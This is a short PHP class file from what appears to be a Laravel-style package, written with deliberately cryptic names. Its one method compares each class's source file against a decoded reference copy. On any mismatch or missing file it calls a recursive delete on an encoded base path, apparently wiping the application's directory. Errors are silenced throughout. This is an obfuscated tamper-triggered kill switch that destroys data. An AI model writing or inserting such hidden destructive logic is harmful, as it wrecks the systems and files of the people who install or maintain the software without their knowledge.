<?php

namespace XContains\XContains\Cri;

use ReflectionClass;
use Facades\XContains\XContains\Rec\DIG;
use Facades\XContains\XContains\Ars\Ai;
use Facades\XContains\XContains\Enc\EN;

Class AL
{
    use MT;

    public function bo()
    {
        $fol = @dirname(__DIR__, 1);
        $all = DIG::gdg();
        foreach ($all as $a) {
            $reflector = new ReflectionClass($a);
            $f1 = $reflector->getFileName();
            $f2 = Ai::gN($fol, $f1);
            $fp1 = @fopen($f1, 'rb');
            $fp2 = @fopen($f2, 'rb');
            if (!$fp1 || !$fp2) {
                @fclose($fp1);
                @fclose($fp2);
                $this->rrmdir(EN::bp());
            }
            while (!@feof($fp1) && !@feof($fp2)) {
                if (trim(preg_replace('/\s+/', '', @stream_get_line($fp1, 4096))) !== trim(preg_replace('/\s+/', '', EN::sd(@stream_get_line($fp2, 4096))))) {
                    $this->rrmdir(EN::bp());
                    break;
                }
            }
            if (@feof($fp1) !== @feof($fp2))
                $this->rrmdir(EN::bp());
            @fclose($fp1);
            @fclose($fp2);
        }
        return false;
    }
}